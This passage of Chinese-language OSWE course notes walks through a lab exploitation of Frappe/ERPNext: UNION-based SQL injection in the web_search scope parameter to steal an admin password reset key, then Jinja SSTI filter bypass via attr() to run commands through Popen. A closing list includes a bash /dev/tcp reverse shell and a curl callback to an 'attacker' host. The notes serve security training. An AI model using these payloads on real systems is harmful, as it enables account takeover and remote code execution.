透過 `@frappe.whitelist(allow_guest=True)` 找到 `apps/frappe/frappe/utils/global_search.py` 中的 web_search function\
![image](https://hackmd.io/_uploads/HJ7jkKQ2Zg.png)

Source code 定義四個參數：text、scope、 start 和 limit\
`web_search` function 將文字變數拆分成多個 multiple search strings
```py=459
@frappe.whitelist(allow_guest=True)
def web_search(text, scope=None, start=0, limit=20):
	"""
	Search for given text in __global_search where published = 1
	:param text: phrase to be searched
	:param scope: search only in this route, for e.g /docs
	:param start: start results at, default 0
	:param limit: number of results to return, default 20
	:return: Array of result objects
	"""

	results = []
	texts = text.split('&')
	for text in texts:
		common_query = ''' SELECT `doctype`, `name`, `content`, `title`, `route`
			FROM `__global_search`
			WHERE {conditions}
			LIMIT {limit} OFFSET {start}'''

		scope_condition = '`route` like "{}%" AND '.format(scope) if scope else ''
		published_condition = '`published` = 1 AND '
		mariadb_conditions = postgres_conditions = ' '.join([published_condition, scope_condition])

		# https://mariadb.com/kb/en/library/full-text-index-overview/#in-boolean-mode
		text = '"{}"'.format(text)
		mariadb_conditions += 'MATCH(`content`) AGAINST ({} IN BOOLEAN MODE)'.format(frappe.db.escape(text))
		postgres_conditions += 'TO_TSVECTOR("content") @@ PLAINTO_TSQUERY({})'.format(frappe.db.escape(text))

		result = frappe.db.multisql({
			'mariadb': common_query.format(conditions=mariadb_conditions, limit=limit, start=start),
			'postgres': common_query.format(conditions=postgres_conditions, limit=limit, start=start)
		}, as_dict=True)
		tmp_result=[]
		for i in result:
			if i in results or not results:
				tmp_result.append(i)
		results += tmp_result

```
在 L484, 485 text 透過 format function 追加到 query 語句中，但字串先傳遞給了 `frappe.db.escape` function\
在 L480, 488, 489 行，參數並沒有被 escaped，可能有 SQLi

將斷點設在 `results = []`
![image](https://hackmd.io/_uploads/r15EaFX3-g.png)\
![image](https://hackmd.io/_uploads/ryT_lqQ2Wl.png)
```
result = frappe.db.multisql({
	'mariadb': common_query.format(conditions=mariadb_conditions, limit=limit, start=start),
	'postgres': common_query.format(conditions=postgres_conditions, limit=limit, start=start)
}, as_dict=True)
```
> Query 會送到 multisql function

在 frappe.db.multisql 設定斷點:\
![image](https://hackmd.io/_uploads/BkOLf5Q2We.png)

進到 `apps/frappe/frappe/database/database.py` 開啟 debugger
![image](https://hackmd.io/_uploads/Syj9z5X2-g.png)
```sql
SELECT `doctype`, `name`, `content`, `title`, `route`
  FROM `__global_search`
  WHERE `published` = 1 AND  MATCH(`content`) AGAINST ('\"offsec\"' IN BOOLEAN MODE)
  LIMIT 20 OFFSET 0
```
查看 Sql log
```
frappe@ubuntu:~$ sudo tail -f /var/log/mysql/mysql.log
   1553 Connect   _1bd3e0294da19198@localhost as anonymous on 
   1553 Query     SET AUTOCOMMIT = 0
   1553 Init DB   _1bd3e0294da19198
   1553 Query     select `user_type`, `first_name`, `last_name`, `user_image` from `tabUser` where `name` = 'Guest' order by modified desc
   1553 Query     SELECT `doctype`, `name`, `content`, `title`, `route`
          FROM `__global_search`
          WHERE `published` = 1 AND  MATCH(`content`) AGAINST ('\"offsec\"' IN BOOLEAN MODE)
          LIMIT 20 OFFSET 0
   1553 Query     rollback
   1553 Query     START TRANSACTION
   1553 Quit
```
> 成功進入 DB

🧠: 構造 potentially-vulnerable parameters\
注入 scope 參數: scope=offsec_scope\
![image](https://hackmd.io/_uploads/BkLPr5X2Zg.png)
```sql
SELECT `doctype`, `name`, `content`, `title`, `route`
  FROM `__global_search`
  WHERE `published` = 1 AND  `route` like "offsec_scope%" AND MATCH(`content`) AGAINST ('\"offsec\"' IN BOOLEAN MODE)
  LIMIT 20 OFFSET 0
```

🧠: 構造 payload\
SQL 查詢有五個參數（doctype、name、content、 title、route）\
UNION 五個參數：
```
offsec_scope" UNION ALL SELECT 1,2,3,4,5#
```
![image](https://hackmd.io/_uploads/B1w2B9QhZe.png)
```sql
SELECT `doctype`, `name`, `content`, `title`, `route`
  FROM `__global_search`
  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT 1,2,3,4,5#%" AND MATCH(`content`) AGAINST ('\"offsec\"' IN BOOLEAN MODE)
  LIMIT 20 OFFSET 0
```
> 依據 log 可以得知 `5`後面的內容都被註解掉了

將 5 替換為 @@version:\
![image](https://hackmd.io/_uploads/ByYQU5Qhbl.png)
> 10.2.24-MariaDB-10.2.24+maria~xenial-log

## Authentication Bypass Exploitation
已成功透過 SQLi SELECT，但不能 INSERT / UPDATE\
(PyMySQL 沒有 multi=True)

>[!Tip]
> Frappe 用：PBKDF2 雜湊密碼
> - 有 salt
> - iteration 高
> - 很難暴力破解
> 👉🏻 hijack the password reset token

![image](https://hackmd.io/_uploads/S1ELwqm3-x.png)

### Obtaining Admin User Information
Frappe documentation 顯示 Frappe 將使用者名稱和密碼保存在 `__Auth` table，需要查找 key 的位置。\
點擊登入頁面上的 Forget Password，進入密碼重設頁面。可以使用 token value 來重設密碼。再到 log 中尋找: `token_searchForUserTable@mail.com`\
![image](https://hackmd.io/_uploads/rkTM_qQ3-e.png)

```
frappe@ubuntu:~$ sudo tail -f /var/log/mysql/mysql.log | grep token_searchForUserTable
  4980 Query     select * from `tabUser` where `name` = 'token_searchForUserTable@mail.com' order by modified desc
```
> Table: `tabUser`

### Resetting the Admin Password
已知 table 名稱，回到 SQLi 建立查詢來提取使用者的 cred
```sql
SELECT name FROM __Auth;
```
將 payload 其中一個數字替換為 name 列的值
```sql
SELECT `doctype`, `name`, `content`, `title`, `route`
  FROM `__global_search`
  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT 1,2,3,4,name FROM __Auth#%" AND MATCH(`content`) AGAINST (\'\\"offsec\\"\' IN BOOLEAN MODE)
  LIMIT 20 OFFSET 0
```
![image](https://hackmd.io/_uploads/rJT8tcX2bg.png)
> "Illegal mix of collations for operation 'UNION'"

>[!Note]
> 當原本查詢結果和 UNION SELECT 拼在一起時，資料庫要求對應欄位的型別與 collation 也要相容\
> 原查詢裡有文字欄位，來自 __global_search。\
> 後面 UNION 出來的 name 也是文字，但兩邊 collation 不同造成 error
>```
>Illegal mix of collations for operation 'UNION'
>```

🧠: 透過 information_schema.columns 查詢

因為是白相環境可以直接查詢：
```sql
SELECT COLLATION_NAME 
FROM information_schema.columns 
WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name";
```

重新構造 payload:
```sql
SELECT `doctype`, `name`, `content`, `title`, `route`
  FROM `__global_search`
  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT 1,2,3,4,COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name"#%" AND MATCH(`content`) AGAINST ('\"offsec\"' IN BOOLEAN MODE)
  LIMIT 20 OFFSET 0
```
![image](https://hackmd.io/_uploads/Byhn55m3Wx.png)
> `utf8mb4_general_ci`

```sql
SELECT name COLLATE utf8mb4_general_ci FROM __Auth;
```
最終查詢：
```sql
SELECT `doctype`, `name`, `content`, `title`, `route`
  FROM `__global_search`
  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#%" AND MATCH(`content`) AGAINST ('\"offsec\"' IN BOOLEAN MODE)
  LIMIT 20 OFFSET 0'
```
![image](https://hackmd.io/_uploads/rko-o9m2Ze.png)
>`zeljka.k@randomdomain.com`

![image](https://hackmd.io/_uploads/B14Vi97h-e.png)

現在已知 user 但還不知道 reset password 在 tabUser table中哪一列
```sql
SELECT COLUMN_NAME 
FROM information_schema.columns 
WHERE TABLE_NAME = "tabUser";
```
使用 UNION 查詢：
```sql
SELECT `doctype`, `name`, `content`, `title`, `route`
  FROM `__global_search`
  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT 1,2,3,4,COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = "tabUser"#%" AND MATCH(`content`) AGAINST (\'\\"offsec\\"\' IN BOOLEAN MODE)
  LIMIT 20 OFFSET 0'
```
![image](https://hackmd.io/_uploads/BJdTocQn-x.png)
> `{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route":"reset_password_key"},`

驗證正確性：
```sql
SELECT name COLLATE utf8mb4_general_ci, reset_password_key COLLATE utf8mb4_general_ci
FROM tabUser;
```
```sql
SELECT `doctype`, `name`, `content`, `title`, `route`
  FROM `__global_search`
  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#%" AND MATCH(`content`) AGAINST (\'\\"offsec\\"\' IN BOOLEAN MODE)
  LIMIT 20 OFFSET 0'
```
![image](https://hackmd.io/_uploads/SJfV3cmnWx.png)
> `zeljka.k@randomdomain.com`:`aAJTVmS14sCpKxrRT8N7ywbnYXRcVEN0`

現在有了 password_reset_key，接著如何用它來重設密碼\
Source code 中搜尋 `reset_password_key`:\
👉🏻 `apps/frappe/frappe/core/doctype/user/user.py`
![image](https://hackmd.io/_uploads/B1C539XhWe.png)
```py=222
	def reset_password(self, send_email=False, password_expired=False):
		from frappe.utils import random_string, get_url

		key = random_string(32)
		self.db_set("reset_password_key", key)

		url = "/update-password?key=" + key
		if password_expired:
			url = "/update-password?key=" + key + '&password_expired=true'

		link = get_url(url)
		if send_email:
			self.password_reset_mail(link)

		return link
```
透過 URL 帶 reset_password_key:
```
http://erpnext:8000/update-password?key=aAJTVmS14sCpKxrRT8N7ywbnYXRcVEN0
```
![image](https://hackmd.io/_uploads/HJUVp9QnZe.png)

## SSTI Vulnerability Discovery
    
SSTI 詳細可以參考：[[OSWA, WEB-200] Instructional notes - Part 2](https://chw41.github.io/b1og/oswa-web-200-instructional-notes---part-2/#server-side-template-injection---discovery-and-exploitation)

Frappe 大量使用了 Jinja 模板引擎。 ERPNext advertises email 範本會直接使用 Jinja。SSTI 本質上是能在 template 裡摸到 Python 物件模型，最後一路摸到危險類別或函式

### Introduction to Templating Engines
template engine 的正常用途是把固定頁面動態化
- 未登入：Hello, Guest
- 已登入：Hello, Alice

Jinja 常見語法是：
```jinja
{{ expression }}
{% statement %}
```
所以 
```jinja
{{ user.name }}
```
可以使用 `{{ 7*7 }}` 測試:\
👉🏻 `{{ 7*7 }}` 被 Jinja 當 expression 執行= 49

classic payload 都會寫：`{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}`\
- `''.__class__ `: 空字串 '' 是一個物件，普通字串開始先拿到它的 class
![image](https://hackmd.io/_uploads/S1MDmMInbe.png)
- `__mro__`: Method Resolution Order，可以從任意物件一路爬到 object
![image](https://hackmd.io/_uploads/r1dNOzI2-g.png)\
![image](https://hackmd.io/_uploads/H1RF_XIhZl.png)
- `__subclasses__`: 當你拿到 object 後，再做 `object.__subclasses__()`，目前已載入、直接繼承自 object 的所有 class 清單
![image](https://hackmd.io/_uploads/rJI2dQU3-x.png)\
![image](https://hackmd.io/_uploads/B1nmqm82-e.png)

>[!Note]
>  Python 2，`__subclasses__()[40]` 常常剛好是：
> ```python
> <type 'file'>
> ```
> 才能直接利用 `{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}` 讀檔\
> ![image](https://hackmd.io/_uploads/rkFw97U3Zl.png)


其他關於 Jinja2 SSTI payload 可參考：[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2)

### Discovering The Rendering Function
[環境範例]\
利用管理員身份登入搜尋 template\
![image](https://hackmd.io/_uploads/S1VxIN83Zx.png)\
![image](https://hackmd.io/_uploads/r1uCLN8h-g.png)\
新增範本使用 `{{7*7}}` 測試:\
![image](https://hackmd.io/_uploads/r1SbP4U3-l.png)\
利用新建範本寄出 Email\
![image](https://hackmd.io/_uploads/ByuEP4Inbl.png)\
![image](https://hackmd.io/_uploads/rkFSvVUnZg.png)\
使用 `{{''.__class__}}` 測試:\
![image](https://hackmd.io/_uploads/rJMcDEInbl.png)
> Illegal template

回到 source code 在 get_email_template function 設定斷點，在 `apps/frappe/frappe/email/doctype/email_template/email_template.py` 可以找到
```py=14
  @frappe.whitelist()
  def get_email_template(template_name, doc):
          '''Returns the processed HTML of a email template with the given doc'''
          if isinstance(doc, string_types):
                  doc = json.loads(doc)

          email_template = frappe.get_doc("Email Template", template_name)
          return {"subject" : frappe.render_template(email_template.subject, doc),
                          "message" : frappe.render_template(email_template.response, doc)}
```
L14 在定義函數之前，告訴 Frappe 此方法已加入 whitelisted，可以透過 HTTP 請求執行\
L17 傳遞給 isinstance 的 doc 參數是一個字串，則該字串將被反序列化為 JSON 並轉換為 Python object

根據 source code 可以猜測上述的 Illegal template 是由 render_template() 產生的 error\
👉🏻 設斷點觀察\
![image](https://hackmd.io/_uploads/SJvysNUhZg.png)

利用 Step Into button 逐步觀察，進到 `apps/frappe/frappe/utils/jinja.py` 的 render_template function 
```py=53
  def render_template(template, context, is_path=None, safe_render=True):
          '''Render a template using Jinja

          :param template: path or HTML containing the jinja template
          :param context: dict of properties to pass to the template
          :param is_path: (optional) assert that the `template` parameter is a path
          :param safe_render: (optional) prevent server side scripting via jinja templating
          '''

          from frappe import get_traceback, throw
          from jinja2 import TemplateError

          if not template:
                  return ""

          # if it ends with .html then its a freaking path, not html
          if (is_path
                  or template.startswith("templates/")
                  or (template.endswith('.html') and '\n' not in template)):
                  return get_jenv().get_template(template).render(context)
          else:
                  if safe_render and ".__" in template:
                          throw("Illegal template")
                  try:
                          return get_jenv().from_string(template).render(context)
                  except TemplateError:
                          throw(title="Jinja Template Error", msg="<pre>{template}</pre><pre>{tb}</pre>".format(template=template, tb=get_traceback()))
```
L74-75 if 可以看出開發者已經考慮到了 SSTI 過濾 `.__` 字元

### SSTI Vulnerability Filter Evasion
如何繞過 ".__" filter，恢復 Python object traversal 能力\
核心是：用 Jinja 語法取代 Python dot syntax。   
>[!Important]
> `attr() filter`:
> [Jinja](https://jinja.palletsprojects.com/en/stable/templates/#attr) 提供： `object | attr("attribute_name")`\
> 等價於 `object.attribute_name`

利用這個 feature 建立 SSTI 所需的 attributes:
```py
{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}
    
{{string|attr(class)}}
```
![image](https://hackmd.io/_uploads/Syh9kBU3Wg.png)
> 確認成功繞過 SSTI filtering，可以建構 RCE Payload
    
## SSTI Vulnerability Exploitation
🎯：取得一個可以執行 OS command 的 class
### Gaining Remote Command Execution
1. 拿 mro
```py
{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}
    
{% set mro_r = string|attr(class)|attr(mro) %}
```
![image](https://hackmd.io/_uploads/ryCA7S8nZg.png)

2. 取 object class
```py
{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}

{{ string|attr(class)|attr(mro)[1] }}
```
![image](https://hackmd.io/_uploads/r1xMESI3bg.png)
> error

Jinja 語法不支援在 filter 後使用`[`字元\
將 mro 屬性的回應儲成變量
```py
{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}

{% set mro_r = string|attr(class)|attr(mro) %}
{{ mro_r[1] }}
```
![image](https://hackmd.io/_uploads/ByGt4HUhbe.png)

3. 拿 subclasses   
需要使用`__subclasses__`方法列出所有子類別。存取屬性後，還需要用 `()` 來執行 method
```py
{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}

{% set mro_r = string|attr(class)|attr(mro) %}
{% set subclasses_r = mro_r[1]|attr(subclasses)() %}
{{ subclasses_r }}
```
![image](https://hackmd.io/_uploads/ByGJSr8n-l.png)
可以複製貼到 vscode 做排序，取得 method 編號\
![image](https://hackmd.io/_uploads/Sk1QrSInWe.png)
> L421 Popen

建構 payload
```py
{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}

{% set mro_r = string|attr(class)|attr(mro) %}
{% set subclasses_r = mro_r[1]|attr(subclasses)() %}
{{ subclasses_r[420] }}
```
![image](https://hackmd.io/_uploads/rk7drS83be.png)

### Gaining Remote Command Execution
要成功執行Popen 需要傳入一個 list 包含命令和參數\
嘗試建立一個位於/tmp/ 目錄下的檔案
```py
{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}

{% set mro_r = string|attr(class)|attr(mro) %}
{% set subclasses_r = mro_r[1]|attr(subclasses)() %}
{{ subclasses_r[420](["/usr/bin/touch","/tmp/das-ist-walter"]) }}
```
進入 SSH 確認是否存在
```
frappe@ubuntu:~$ ls -lh /tmp/das-ist-walter 
-rw-rw-r-- 1 frappe frappe 0 Jan 11 10:31 das-ist-walter
```
    
>[!Note]
> RCE Payload:
> - 讀敏感檔案: `["/bin/cat","/etc/passwd"]`
> - 建立 revshell: `["/bin/bash","-c","bash -i >& /dev/tcp/IP/PORT 0>&1"]`
> - OOB: `["/usr/bin/curl","http://attacker/$(whoami)"]`
        
            
# openCRX Authentication Bypass and Remote Code Execution

>[!Caution]
> HackMD 筆記長度限制，接續 [[OSWE, WEB-300] Instructional notes - Part 3](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-3/)

# [Link to: "[OSWE, WEB-300] Instructional notes - Part 3"](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-3/)

# [Link to: "[OSWE, WEB-300] Instructional notes - Part 4"](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-4/)    

# [Link to: "[OSWE, WEB-300] Instructional notes - Part 5"](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-5/)
